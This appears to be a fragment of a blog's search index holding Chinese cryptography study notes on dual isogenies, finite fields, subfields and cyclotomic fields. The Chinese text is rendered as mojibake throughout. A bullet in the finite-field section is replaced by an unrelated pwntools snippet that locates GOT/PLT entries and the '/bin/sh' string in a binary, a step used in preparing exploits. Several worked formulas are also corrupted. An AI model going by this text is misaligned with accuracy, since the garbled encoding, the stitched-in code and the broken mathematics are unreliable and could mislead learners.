Ho\boldsymbol{m}(E^{\prime},E^{\prime\prime})$,æœ‰<br>$\phi\circ(\alpha+\beta)=\phi\circ\alpha+\phi\circ\beta$</p><p>å¯¹äº$\phi\in Ho\boldsymbol{m}(E,E^{\prime}),\boldsymbol{\alpha},\beta\in H\boldsymbol{om}(E^{\prime},E^{\prime\prime})$,æœ‰<br>$(\alpha+\beta)\circ\phi=\alpha\circ\phi+\beta\circ\phi$</p><h4 id="æ¶ˆå»å¾‹"><a href="#æ¶ˆå»å¾‹" class="headerlink" title="æ¶ˆå»å¾‹"></a>æ¶ˆå»å¾‹</h4><p>æ¶ˆå»å¾‹ï¼šè®¾ $\boldsymbol{\alpha},\boldsymbol{\beta}{:}E\to E^{\prime},\boldsymbol{\phi}{:}E^{\prime}\to E^{\prime\prime}$æ˜¯åŒæºï¼Œæœ‰</p><script type="math/tex; mode=display">\phi\circ\alpha=\phi\circ\beta\quad\Longrightarrow\quad\alpha=\beta</script><p>è®¾ $\phi{:}E\longrightarrow E^{\prime},\boldsymbol{\alpha},\boldsymbol{\beta}{:}E^{\prime}\to E^{\prime\prime}$æ˜¯åŒæºï¼Œæœ‰</p><script type="math/tex; mode=display">\alpha\circ\phi=\beta\circ\phi\Rightarrow\alpha=\beta</script><h3 id="å¯¹å¶åŒæº"><a href="#å¯¹å¶åŒæº" class="headerlink" title="å¯¹å¶åŒæº"></a>å¯¹å¶åŒæº</h3><p><strong>å®šä¹‰(å¯¹å¶åŒæº):</strong> </p><p>è®¾åŒæº $\phi:E \rightarrow Eâ€™$ , å…¶åº¦ä¸º $deg(\phi)$ , åˆ™ $\phi$ å”¯ä¸€çš„å¯¹å¶åŒæºä¸º $\widehat{\phi}$ , æ»¡è¶³ </p><p>$\widehat{\phi} \circ \phi = [deg(\phi)]$ </p><blockquote><p>$\text{å¦å¤–,å®šä¹‰}[\widehat0]:=[0]$</p></blockquote><p>ä¾‹: è®¾ $deg(\phi) = 3$, åˆ™ $\widehat{\phi} \circ \phi = [deg(\phi)] = [3]$, å³ å¯¹äºä»»æ„ç‚¹ $P \in E$, æœ‰ <script type="math/tex">\widehat{\phi} \circ \phi(P) = \widehat{\phi}(\phi(P)) = [3](P) = 3P</script></p><p><strong>æ€§è´¨1</strong>ï¼šå¦‚æœ $\widehat{\phi} \circ \phi = [\deg(\phi)]$ï¼Œé‚£ä¹ˆ $\phi \circ \widehat{\phi} = [\deg(\phi)]$ï¼Œä¹Ÿå³ <script type="math/tex">\widehat{\widehat{\phi}} = \phi</script> </p><p>è¯æ˜ï¼š$(\phi \circ \widehat{\phi}) \circ \phi = \phi \circ (\widehat{\phi} \circ \phi)$ ï¼ˆç»“åˆå¾‹ï¼‰ </p><p>$= \phi \circ [\deg(\phi)]$ ï¼ˆå¯¹å¶åŒæºå®šä¹‰ï¼‰ </p><p>$= [\deg(\phi)] \circ \phi$ ï¼ˆã€ŠåŒæ€ç¾¤ã€‹å¼•ç†2ï¼‰ </p><p>åˆ™ $\phi \circ \widehat{\phi} = [\deg(\phi)]$ ï¼ˆæ¶ˆå»å¾‹ï¼‰</p><p><strong>æ€§è´¨2</strong>ï¼šå¯¹äºä»»æ„ $n\in\mathbb{Z}$,æœ‰$[\widehat n]=[n]$<br>è¯æ˜ï¼š</p><script type="math/tex; mode=display">\begin{aligned}[n]\circ[n]&=[n^2]\\&=[deg([n])]\end{aligned}</script><p><strong>æ€§è´¨3</strong>ï¼šå¯¹äºä»»æ„ $\alpha, \beta \in Hom(E,Eâ€™)$ï¼Œæœ‰ $\widehat{\alpha + \beta} = \widehat{\alpha} + \widehat{\beta}$</p><p><strong>æ€§è´¨4</strong>ï¼šå¯¹äºä»»æ„$\alpha\in Hom(E^{\prime},E^{\prime\prime}),\beta\in Hom(E,E^{\prime})$,æœ‰</p><script type="math/tex; mode=display">\widehat{\alpha\circ\beta}=\widehat{\beta}\circ\widehat{\alpha}</script><blockquote><p>$\alpha\circ\beta$ç›¸å½“äº$\phi$<br>$\widehat{\beta}\circ\widehat{\alpha}$ç›¸å½“äº$\widehat{\phi}$<br>$[deg(\alpha\circ\beta)]$ç›¸å½“äº$[deg(\phi)]$</p></blockquote><h1 id="æœªå®Œå¾…ç»­â€¦â€¦"><a href="#æœªå®Œå¾…ç»­â€¦â€¦" class="headerlink" title="æœªå®Œå¾…ç»­â€¦â€¦"></a>æœªå®Œå¾…ç»­â€¦â€¦</h1>]]></content>
      
      
      <categories>
          
          <category> Cryptoæ•°å­¦åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
            <tag> ç­‘åŸºç¯‡ </tag>
            
            <tag> æ¤­åœ†æ›²çº¿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç­‘åŸºç¯‡Â·æŠ½è±¡ä»£æ•°Â·æœ‰é™åŸŸ</title>
      <link href="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E6%9C%89%E9%99%90%E5%9F%9F/"/>
      <url>/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E6%9C%89%E9%99%90%E5%9F%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·å››ï¼ˆæœ‰é™åŸŸï¼‰"><a href="#å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·å››ï¼ˆæœ‰é™åŸŸï¼‰" class="headerlink" title="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·å››ï¼ˆæœ‰é™åŸŸï¼‰"></a>å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·å››ï¼ˆæœ‰é™åŸŸï¼‰</h2><hr><h1 id="æœ‰é™åŸŸ"><a href="#æœ‰é™åŸŸ" class="headerlink" title="æœ‰é™åŸŸ"></a>æœ‰é™åŸŸ</h1><hr><h2 id="æœ‰é™åŸŸ-ä¼½ç½—ç“¦åŸŸ"><a href="#æœ‰é™åŸŸ-ä¼½ç½—ç“¦åŸŸ" class="headerlink" title="æœ‰é™åŸŸ(ä¼½ç½—ç“¦åŸŸ)"></a>æœ‰é™åŸŸ(ä¼½ç½—ç“¦åŸŸ)</h2><blockquote><p><strong>æ¦‚å¿µå›é¡¾</strong>:</p><ul><li><p><strong>æœ‰é™åŸŸ</strong>ï¼šå…ƒç´ ä¸ªæ•°(é˜¶)æœ‰é™çš„åŸŸã€‚</p></li><li><p><strong>ç‰¹å¾</strong>ï¼š$ma=\theta$ ($\forall a\in R)$çš„æœ€å°æ­£æ•´æ•°$m;$ å¦åˆ™ $m=0$ã€‚å³ Char $R=m$<br>$(me=\theta\left(e\in R\right)$çš„æœ€å°æ­£æ•´æ•°$m;$ å¦åˆ™ $m=0)$</p><p><strong>æœ‰é™åŸŸçš„ç‰¹å¾ä¸€å®šæ˜¯ç´ æ•°</strong></p></li><li><p><strong>ç´ åŸŸ</strong>ï¼šä¸åŒ…å«ä»»ä½•çœŸå­åŸŸçš„åŸŸ (ä»»ä½•çœŸå­é›†éƒ½ä¸ä¼šæ„æˆå…¶å­åŸŸ)</p></li></ul></blockquote><p>ä»ä¸‹é¢å¼€å§‹ï¼Œè‹¥æ— ç‰¹æ®Šè¯´æ˜$p$ä¸ºç´ æ•°ï¼Œ$F$ä¸ºæœ‰é™åŸŸã€‚</p><p><strong>å®šç†1</strong>:é˜¶ä¸ºç´ æ•°çš„æœ‰é™åŸŸå¿…æ˜¯ç´ åŸŸï¼Œå…¶ç‰¹å¾æ˜¯è¿™ä¸ªç´ æ•°</p><p><strong>å®šç†2</strong>:ä»»ä½•æœ‰é™åŸŸéƒ½åŒ…å«ä¸€ä¸ªåŒæ„äº$Z_p$çš„å­åŸŸ</p><p>å¼•ç†:$Kæ˜¯Fçš„å­åŸŸ,\quad|K|=q,\quad[F{:}K]=n,\quadåˆ™|F|=q^n$</p><p><strong>å®šç†2</strong>: $Fçš„ç‰¹å¾æ˜¯p,Kæ˜¯Fçš„ç´ å­åŸŸ,[F;K]=n, åˆ™ |F|=p^n$</p><hr><h2 id="æœ‰é™åŸŸçš„å”¯ä¸€æ€§"><a href="#æœ‰é™åŸŸçš„å”¯ä¸€æ€§" class="headerlink" title="æœ‰é™åŸŸçš„å”¯ä¸€æ€§"></a>æœ‰é™åŸŸçš„å”¯ä¸€æ€§</h2><p><strong>å®šç†</strong> (æœ‰é™åŸŸçš„å”¯ä¸€æ€§):å¯¹äºä»»æ„ç´ æ•°$p$,ä»»æ„æ­£æ•´æ•°$n$,éƒ½å­˜åœ¨é˜¶ä¸º$p^n$çš„æœ‰é™åŸŸã€‚ä»»ä½•é˜¶ä¸º$p^n$çš„æœ‰é™åŸŸéƒ½åŒæ„äº$x^{p^n}-x$åœ¨$Z_p$ä¸Šçš„åˆ†è£‚åŸŸã€‚</p><p><strong>å¼•ç†</strong>ï¼š$F$çš„é˜¶ä¸º$q$,$K$æ˜¯$F$çš„å­åŸŸï¼Œ$\forall a\in F$,åˆ™</p><p>(1) $a^q=a$</p><p>$(2)x^q-x\in K[X]$åœ¨$K$ä¸Šçš„åˆ†è£‚åŸŸä¸º$F$,ä¸” $x^q-x=\prod_{a\in F}(x-a)$</p><p><strong>ç»“è®º</strong>:å…·æœ‰ç›¸åŒå…ƒç´ çš„æœ‰é™åŸŸéƒ½æ˜¯åŒæ„çš„<br>é˜¶ä¸ºqçš„æœ‰é™åŸŸï¼Œç»Ÿä¸€ç”¨<strong>F</strong>è¡¨ç¤º(æœ‰çš„ä¹¦é‡Œç”¨<strong>GF(q)</strong>è¡¨ç¤º)</p><hr><h2 id="æœ‰é™åŸŸçš„ç»“æ„ç‰¹ç‚¹"><a href="#æœ‰é™åŸŸçš„ç»“æ„ç‰¹ç‚¹" class="headerlink" title="æœ‰é™åŸŸçš„ç»“æ„ç‰¹ç‚¹"></a>æœ‰é™åŸŸçš„ç»“æ„ç‰¹ç‚¹</h2><ul><li><p>æœ‰é™åŸŸ$\Longrightarrow$é˜¶ä¸º$p^n$</p><p>ä»»æ„ç´ æ•°$p$,ä»»æ„æ­£æ•´æ•°$n\Rightarrow$å­˜åœ¨é˜¶ä¸º$p^n$çš„æœ‰é™åŸŸ</p></li><li><p>é˜¶ä¸º$p^n$çš„æœ‰é™åŸŸï¼Œç‰¹å¾ä¸º$p$,åŒ…å«é˜¶ä¸º$p$çš„ç´ å­åŸŸ</p><p>$n$æ˜¯å…¶åœ¨è¯¥ç´ å­åŸŸä¸Šçš„æ‰©å¼ ç»´åº¦</p></li><li><p>xxxxxxxxxx10 1&gt;&gt;&gt; e = ELF(â€˜/bin/catâ€™)2&gt;&gt;&gt; print hex(e.address)  # æ–‡ä»¶è£…è½½çš„åŸºåœ°å€30x4000004&gt;&gt;&gt; print hex(e.symbols[â€˜writeâ€™]) # å‡½æ•°åœ°å€,symbols,got,pltå‡æ˜¯åˆ—è¡¨50x4016806&gt;&gt;&gt; print hex(e.got[â€˜writeâ€™]) # GOTè¡¨çš„åœ°å€70x60b0708&gt;&gt;&gt; print hex(e.plt[â€˜writeâ€™]) # PLTçš„åœ°å€90x40168010&gt;&gt;&gt; print hex(e.search(â€˜/bin/shâ€™).next())# å­—ç¬¦ä¸²/bin/shçš„åœ°å€å­—ç¬¦ä¸²åŠ ï¼ˆï¼‰python</p></li></ul><hr><h2 id="å­åŸŸå‡†åˆ™-subfield-criterion"><a href="#å­åŸŸå‡†åˆ™-subfield-criterion" class="headerlink" title="å­åŸŸå‡†åˆ™ (subfield criterion)"></a>å­åŸŸå‡†åˆ™ (subfield criterion)</h2><p><strong>å®šç† (å­åŸŸå‡†åˆ™)</strong>:è®¾$q=p^n$,<strong>æœ‰é™åŸŸ</strong>$F_q$<strong>æ¯ä¸ªå­åŸŸçš„é˜¶éƒ½å…·æœ‰</strong>$p^m$çš„<strong>å½¢å¼</strong>ï¼Œ<br>å…¶ä¸­$m$æ˜¯$n$çš„<strong>æ­£å› å­</strong>ã€‚åä¹‹ï¼Œå¦‚æœ$m$æ˜¯$n$çš„<strong>æ­£å› å­</strong>ï¼Œå¿…ç„¶å­˜åœ¨$F_q$çš„å”¯ä¸€å­åŸŸï¼Œå…¶é˜¶ä¸º$p^m$ã€‚</p><blockquote><p>ä¾‹ï¼šä¾‹ï¼šæ±‚æœ‰é™åŸŸ$F_{2^{30}}$çš„æ‰€æœ‰å­åŸŸ</p><p>è§£ï¼š30çš„æ­£å› å­æœ‰1ï¼Œ2,3,5,6,10,15,30,åˆ™<br>æ‰€æ±‚å­åŸŸä¸º$F_2,F_{2^2},F_{2^3},F_{2^5},F_{2^6},F_{2^{10}},F_{2^{15}},F_{2^{30}}$</p><p><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E6%9C%89%E9%99%90%E5%9F%9F/image-20240820085851977.png" alt="image-20240820085851977"></p></blockquote><hr><h2 id="æœ‰é™åŸŸçš„ä¹˜æ³•ç¾¤"><a href="#æœ‰é™åŸŸçš„ä¹˜æ³•ç¾¤" class="headerlink" title="æœ‰é™åŸŸçš„ä¹˜æ³•ç¾¤"></a>æœ‰é™åŸŸçš„ä¹˜æ³•ç¾¤</h2><p>$F_q$:æœ‰é™åŸŸ(æœ‰$q$ä¸ªå…ƒç´ )<br>$F_q^*$:æœ‰é™åŸŸçš„ä¹˜æ³•ç¾¤(ä¸åŒ…å«é›¶å…ƒï¼Œåªæœ‰$q-1$ä¸ªå…ƒç´ )</p><p><strong>å®šç†1</strong>ï¼šæœ‰é™åŸŸçš„ä¹˜æ³•ç¾¤æ˜¯<strong>å¾ªç¯ç¾¤</strong></p><h3 id="æœ¬åŸå…ƒ-primitive-element"><a href="#æœ¬åŸå…ƒ-primitive-element" class="headerlink" title="æœ¬åŸå…ƒ(primitive element)"></a>æœ¬åŸå…ƒ(primitive element)</h3><p><strong>å®šä¹‰ (æœ¬åŸå…ƒ)</strong>: æœ‰é™åŸŸ$F_q$ä¹˜æ³•ç¾¤çš„<strong>ç”Ÿæˆå…ƒ</strong>ç§°ä¸º$F_q$çš„<strong>æœ¬åŸå…ƒ.</strong></p><p>åŒºåˆ†æ¦‚å¿µï¼š</p><p>æœ¬åŸå…ƒï¼šæœ‰é™åŸŸä¹˜æ³•ç¾¤çš„ç”Ÿæˆå…ƒ<br>åŸæ ¹ï¼šæ¨¡è¿ç®—ä¸‹å¾ªç¯ç¾¤çš„ç”Ÿæˆå…ƒ</p><p><strong>å®šç†2</strong>:$F_ræ˜¯F_qçš„æœ‰é™æ‰©å¼ ,åˆ™F_ræ˜¯F_qçš„å•ä»£æ•°æ‰©å¼ :å¯¹äºä»»æ„F_rçš„æœ¬åŸå…ƒa,éƒ½æœ‰F_r=F_q(a)ã€‚$</p><p><strong>æ¨è®º</strong>ï¼šå¯¹äºä»»æ„æœ‰é™åŸŸ$F_q$,ä»»æ„æ­£æ•´æ•°$n$,$F_q[X]$é‡Œéƒ½æœ‰ä¸€ä¸ªåº¦ä¸º$n$çš„ä¸å¯çº¦å¤šé¡¹å¼ã€‚</p><hr><h2 id="æ„é€ æœ‰é™åŸŸ"><a href="#æ„é€ æœ‰é™åŸŸ" class="headerlink" title="æ„é€ æœ‰é™åŸŸ"></a>æ„é€ æœ‰é™åŸŸ</h2><p>$F_q\rightarrow F_{q^n}$</p><p>åŸºäºâ€œä¸å¯çº¦å¤šé¡¹å¼â€æ„é€ æœ‰é™åŸŸï¼š$F_q[X]/(f(x))$<br>åŸºäºâ€œåŸºâ€æ„é€ æœ‰é™åŸŸï¼š$F_q(a),f(a)=0$</p><script type="math/tex; mode=display">F_{q^n}\colon F_q[X]/(f(x))\cong F_q(a)</script><h3 id="åŸºäºä¸å¯çº¦å¤šé¡¹å¼æ„é€ æœ‰é™åŸŸ"><a href="#åŸºäºä¸å¯çº¦å¤šé¡¹å¼æ„é€ æœ‰é™åŸŸ" class="headerlink" title="åŸºäºä¸å¯çº¦å¤šé¡¹å¼æ„é€ æœ‰é™åŸŸ"></a>åŸºäºä¸å¯çº¦å¤šé¡¹å¼æ„é€ æœ‰é™åŸŸ</h3><p>$f(x)\in F_q[X]$æ˜¯ä¸å¯çº¦å¤šé¡¹å¼ï¼Œåˆ™ $F_q[X]/(f(x))$æ˜¯æœ‰é™åŸŸ<br>$deg(f(x))=n$,åˆ™$F_q<a href="f(x">X</a>)=F_q^n$</p><blockquote><p>ä¾‹å­:$F_{2^{8}}={r(x)|r(x)\in F_2[X],deg(r(x))&lt;8}$</p><p>$r(x)=a_7x^7+\cdots+a_1x+a_0$</p><script type="math/tex; mode=display">r(x){:}0x^{7}+\cdots+0x+0\longrightarrow00\\x^{7}+\cdots+0x+0\longrightarrow01\\\cdots\\x^{7}+\cdots+x+1\longrightarrow FF</script><p>å¤šé¡¹å¼ï¼š$x^6+x^4+x^2+x+1$<br>äºŒè¿›åˆ¶ï¼š01010111</p><p>åå…­è¿›åˆ¶ï¼š57<br>åå…­è¿›åˆ¶ï¼š57+83=D4(äºŒè¿›åˆ¶å¯¹åº”æ¯”ç‰¹å¼‚æˆ–)<br>å¤šé¡¹å¼ï¼š$(x^6+x^4+x^2+x+1)+(x^7+x+1)=x^7+x^6+x^4+x^2$(äºŒè¿›åˆ¶ï¼š11010100åå…­è¿›åˆ¶ï¼š$D4$)</p><p>åå…­è¿›åˆ¶ï¼š57Ã—83<br>å¤šé¡¹å¼ï¼š$(x^6+x^4+x^2+x+1)\times(x^7+x+1)$ mod $f(x)$<br>å¤šé¡¹å¼çš„æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•</p></blockquote><script type="math/tex; mode=display">r_1(x),r_2(x)\in F_{q^n}</script><p>åŠ æ³•ï¼š$r_1(x)+r_2(x)$(ä¸éœ€è¦ $f(x)$å‚ä¸)<br>ä¹˜æ³•ï¼š$r_1(x)r_2(x)$ mod $f(x)$ (æ‰©å±•çš„æ¬§å‡ é‡Œå¾—ç®—æ³•)</p><h3 id="åŸºäºâ€œåŸºâ€æ„é€ æœ‰é™åŸŸ"><a href="#åŸºäºâ€œåŸºâ€æ„é€ æœ‰é™åŸŸ" class="headerlink" title="åŸºäºâ€œåŸºâ€æ„é€ æœ‰é™åŸŸ"></a>åŸºäºâ€œåŸºâ€æ„é€ æœ‰é™åŸŸ</h3><p>1.$ æ‰¾$F_q[X]$é‡Œçš„ä¸å¯çº¦å¤šé¡¹å¼$f(x)$</p><p>2.$ ç®—å‡º$f(x)$çš„ä¸€ä¸ªæ ¹ï¼Œè®¾ä¸º$a$,å³$f(a)=\theta$ã€‚</p><p>æ‰©åŸŸå°±æ˜¯å•ä»£æ•°æ‰©å¼ $F_q(a)$</p><ol><li><p>è®¾$deg(f(x))=n$,åˆ™$F_q(a)$çš„åŸºä¸ºï¼š$e,a,â€¦,a^n-1$</p></li><li><p>$F_q(a)$å…ƒç´ ï¼š$b_0+ b_1a+ \cdots + b_{n- 1}a^{n- 1}$ $( F_q( a) = F_{q^n})$</p><p>$b_iæ˜¯F_qé‡Œçš„å…ƒç´ $</p></li></ol><blockquote><p>ä¾‹ï¼š$f(x)=x^{8}+x^{4}+x^{3}+x+1$</p><p>$f(a)=a^{8}+a^{4}+a^{3}+a^{4}+4$</p><p>$F_{2^{8}}={b_{0}+b_{1}a+\cdots+b_{7}a^{7}|b_{i}\in F_{2}}$</p><p>åå…­è¿›åˆ¶:57<br>äºŒè¿›åˆ¶:01010111<br>å…ƒç´ :$a^6+a^4+a^2+a+1 $</p><p>$57+83=D4\colon\left(a^6+a^4+a^2+a+1\right)+\left(a^7+a+1\right)=a^7+a^6+a^4+a^2$</p><script type="math/tex; mode=display">\begin{aligned}&57\times83\colon(a^6+a^4+a^2+a+1)\times(a^7+a+1)\\&=a^{13}+a^{11}+a^9+a^8+a^6+a^5+a^4+a^3+1\\&f(a)=a^3+a^4+a^3+a+1=0\text{,æœ‰}\\&a^8=-a^4-a^3-a-1=a^4+a^3+a+1\\&a^9=a^5+a^4+a^2+a\\&a^{11}=a^7+a^6+a^4+a^3\\&a^{13}=a^9+a^3+a^5+a^5\\&57\times83=C1:\left(a^6+a^4+a^2+a+1\right)\times\left(a^7+a+1\right)=a^7+a^6+1\end{aligned}</script></blockquote><hr><h2 id="åˆ†åœ†åŸŸ-cyclotomic-field"><a href="#åˆ†åœ†åŸŸ-cyclotomic-field" class="headerlink" title="åˆ†åœ†åŸŸ(cyclotomic field)"></a>åˆ†åœ†åŸŸ(cyclotomic field)</h2><p>$næ˜¯æ­£æ•´æ•°ï¼ŒKæ˜¯ä»»æ„åŸŸï¼Œf(x)=x^n-e\in K[x]$</p><script type="math/tex; mode=display">f(x)=x^n-e=(x-b_1)...(x-b_n)</script><script type="math/tex; mode=display">1\leq i\leq n,\:f(b_i)=b_i^n-e=(x-b_1)\:...(b_i-b_i)\:...(x-b_n)=\theta</script><p>$b_i$ æ˜¯$x^n-e$çš„æ ¹ã€‚</p><p>$x^n-e$åœ¨$K$ä¸Šçš„åˆ†è£‚åŸŸä¸º$K(b_1,â€¦,b_n)$</p><p><strong>å®šä¹‰(åˆ†åœ†åŸŸ)</strong>:$n$æ˜¯æ­£æ•´æ•°ï¼Œ$K$æ˜¯ä»»æ„åŸŸï¼Œ$x^n-e$åœ¨$K$ä¸Šçš„åˆ†<br>è£‚åŸŸç§°ä¸º$K$ä¸Š$n$æ¬¡åˆ†åœ†åŸŸï¼Œè®°ä¸º$K^{(n)}$ã€‚</p><script type="math/tex; mode=display">1\leq i\leq n, f(b_i)=b_i^n-e=(x-b_1) ...(b_i-b_i) ...(x-b_n)=\theta\\\text{æœ‰ }b_i^n=e\text{,å³ }b_1,...,b_n\text{éƒ½æ˜¯}e\text{çš„}n\text{æ¬¡æ ¹ã€‚}\\\text{å®šä¹‰}(n\text{æ¬¡å•ä½æ ¹})\text{:}x^n-e\text{åœ¨}K^{(n)}\text{é‡Œçš„æ ¹}(\text{å³ }b_1,...,b_n)\text{ç§°ä¸º}\\K\text{ä¸Š}n\text{æ¬¡å•ä½æ ¹}(n\text{th roots of unity})\text{ã€‚}</script><p>$E^{(n)}$:$x^n-e$åœ¨$K^{(n)}$é‡Œçš„æ ¹ç»„æˆçš„é›†åˆï¼Œè®°ä¸º$E^{(n)}$<br>$E^{(n)}$çš„ç»“æ„ä¾èµ–äº$n$å’Œ$K$çš„ç‰¹å¾$m$ã€‚</p><p><strong>å®šç†1</strong>ï¼š$K$çš„ç‰¹å¾$m$ä¸æ˜¯$n$çš„å› å­ï¼Œåˆ™$E^{(n)}$æ˜¯<strong>ä¹˜æ³•å¾ªç¯ç¾¤ï¼Œé˜¶</strong>ä¸º$n$ã€‚</p><p><strong>å®šä¹‰$(n$æ¬¡æœ¬åŸå•ä½æ ¹)</strong>:$E^(n)$æ˜¯ä¹˜æ³•å¾ªç¯ç¾¤æ—¶ (å³$m$ä¸æ˜¯$n$çš„å› å­),<br>$E^{(n)}$çš„ç”Ÿæˆå…ƒç§°ä¸º$K$ä¸Š$n$<strong>æ¬¡æœ¬åŸå•ä½æ ¹(primitive $n$th root of</strong><br><strong>unity)ã€‚</strong></p><p><strong>æ¦‚å¿µåŒºåˆ†</strong>ï¼š</p><ul><li>æœ¬åŸå…ƒï¼šæœ‰é™åŸŸä¹˜æ³•ç¾¤çš„ç”Ÿæˆå…ƒ</li><li>åŸæ ¹ï¼šæ¨¡è¿ç®—ä¸‹å¾ªç¯ç¾¤çš„ç”Ÿæˆå…ƒ</li><li>$n$æ¬¡æœ¬åŸå•ä½æ ¹ï¼šä¹˜æ³•å¾ªç¯ç¾¤ $E^{(n)}$çš„ç”Ÿæˆå…ƒ</li></ul><blockquote><p>ä¾‹ï¼š$n$æ¬¡åˆ†åœ†åŸŸ$\mathbb{Q}^(n)$æ˜¯$x^n-1$åœ¨Qä¸Šçš„åˆ†è£‚åŸŸ</p><p>$\mathbb{Q}^{(n)}$æ˜¯å¤æ•°åŸŸçš„å­åŸŸã€‚</p><p><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E6%9C%89%E9%99%90%E5%9F%9F/image-20240821114313909.png" alt="å‡ ä½•æ„ä¹‰"></p></blockquote><h3 id="åˆ†åœ†å¤šé¡¹å¼-cyclotomic-polynomial"><a href="#åˆ†åœ†å¤šé¡¹å¼-cyclotomic-polynomial" class="headerlink" title="åˆ†åœ†å¤šé¡¹å¼ (cyclotomic polynomial)"></a>åˆ†åœ†å¤šé¡¹å¼ (cyclotomic polynomial)</h3><ul><li>$K$çš„ç‰¹å¾ä¸æ˜¯$n$çš„å› å­ï¼Œåˆ™$x^n-e$åœ¨$K^(n)$é‡Œçš„æ ¹å½¢æˆä¹˜æ³•å¾ªç¯ç¾¤$E^{(n)}$</li><li>$E^{(n)}:n$ä¸ªå…ƒç´ ï¼Œ$\phi(n)$ä¸ª<strong>ç”Ÿæˆå…ƒ$(n$æ¬¡æœ¬åŸå•ä½æ ¹)</strong></li></ul><p><strong>å®šä¹‰(åˆ†åœ†å¤šé¡¹å¼)</strong>:</p><p>åŸŸ$K$çš„ç‰¹å¾ä¸æ˜¯æ­£æ•´æ•°$n$çš„å› å­ï¼Œ$a_1,â€¦,a_r$<br>æ˜¯Kä¸Šæ‰€æœ‰$n$æ¬¡æœ¬åŸå•ä½æ ¹ï¼Œåˆ™å¤šé¡¹å¼</p><script type="math/tex; mode=display">Q_n(x)=\prod_{i=1}^r(x-a_i)</script><p>ç§°ä¸º$K$ä¸Š<strong>$n$æ¬¡åˆ†åœ†å¤šé¡¹å¼</strong>ï¼Œå…¶ä¸­$r=\phi(n)$ã€‚</p><p>å®šä¹‰(åˆ†åœ†å¤šé¡¹å¼):åŸŸ$K$çš„ç‰¹å¾ä¸æ˜¯æ­£æ•´æ•°$n$çš„å› å­ï¼Œ$a$æ˜¯$K$ä¸Šçš„<br>ä¸€ä¸ª$n$æ¬¡æœ¬åŸå•ä½æ ¹ï¼Œåˆ™å¤šé¡¹å¼</p><script type="math/tex; mode=display">Q_n(x)=\prod_{s=1}^n(x-a^s)\\gcd(s,n)=1</script><p>ç§°ä¸º$K$ä¸Š<strong>$n$æ¬¡åˆ†åœ†å¤šé¡¹å¼ã€‚</strong></p><p><strong>å®šç†1</strong>:Kçš„ç‰¹å¾ä¸æ˜¯æ­£æ•´æ•°$n$çš„å› å­ï¼Œåˆ™$x^n-e=\prod_{d|n}Q_d(x)$</p><p><strong>å¼•ç†</strong>ï¼š$d$æ˜¯æ­£æ•´æ•°$n$çš„çœŸå› å­ $(1\leq d&lt;n)$,åˆ™$Q_n(x)\mid\frac{x^n-e}{x^d-e}$</p><h3 id="åŸºäºåˆ†åœ†åŸŸæ„é€ æœ‰é™åŸŸ"><a href="#åŸºäºåˆ†åœ†åŸŸæ„é€ æœ‰é™åŸŸ" class="headerlink" title="åŸºäºåˆ†åœ†åŸŸæ„é€ æœ‰é™åŸŸ"></a>åŸºäºåˆ†åœ†åŸŸæ„é€ æœ‰é™åŸŸ</h3><p><strong>å®šç†1ï¼š</strong>æœ‰é™åŸŸ$F$çš„ç‰¹å¾ä¸æ˜¯æ­£æ•´æ•°$n$çš„å› å­ï¼Œåˆ™</p><p>$(1)Q_n(x)$å¯ä»¥åˆ†è§£ä¸º$F[X]$é‡Œ$\phi(n)/d$ä¸ªä¸åŒçš„åº¦ä¸º$d$çš„é¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼çš„ä¹˜ç§¯ï¼Œ$d$ æ˜¯æ»¡è¶³$q^d\equiv1\left(modn\right)$çš„æœ€å°æ­£æ•´æ•°ã€‚<br>$(2)F^{(n)}$æ˜¯è¿™äº›å¤šé¡¹å¼çš„åˆ†è£‚åŸŸ<br>$(3)\left[F^{(n)}{:}F\right]=d$ã€‚è®¾$F=F_q$,åˆ™ $F^{(n)}=F_{q^d}$</p><p><strong>å®šç†2ï¼š</strong>æœ‰é™åŸŸ$K$æ˜¯$F_q$çš„ä»»æ„å­åŸŸï¼Œåˆ™$F_q$æ˜¯$K$ä¸Šçš„$q-1$æ¬¡åˆ†åœ†åŸŸ</p><blockquote><p>ä¾‹ï¼š$F_{16}$æ˜¯$F_2$ã€$F_4$ã€$F_8$ä¸Šçš„15æ¬¡åˆ†åœ†åŸŸ</p></blockquote><p>åŸºäºâ€œåˆ†åœ†åŸŸâ€æ„é€ æœ‰é™åŸŸ</p><p>è®¾$F_p$æ˜¯$F_q$çš„å­åŸŸï¼Œåˆ™$F_q$æ˜¯$F_p$ä¸Šçš„$q-1$æ¬¡åˆ†åœ†åŸŸ</p><ol><li>åœ¨$F_p[X]$é‡Œåˆ†è§£$Q_{q-1}(x)\in F_p[X]$ä¸ºé¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼çš„ä¹˜ç§¯</li><li>æ±‚å‡ºä»»æ„ä¸€ä¸ªé¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼çš„æ ¹$a$,æ˜“çŸ¥$a\in F_q$æ˜¯æœ¬åŸå…ƒ</li><li>$\theta , \boldsymbol{a}, \boldsymbol{a}^2, . . . , \boldsymbol{a}^{q- 1}$å°±æ˜¯$F_q$é‡Œçš„å…ƒç´ </li></ol><hr><h2 id="æœ‰é™åŸŸçš„çŸ©é˜µè¡¨ç¤º"><a 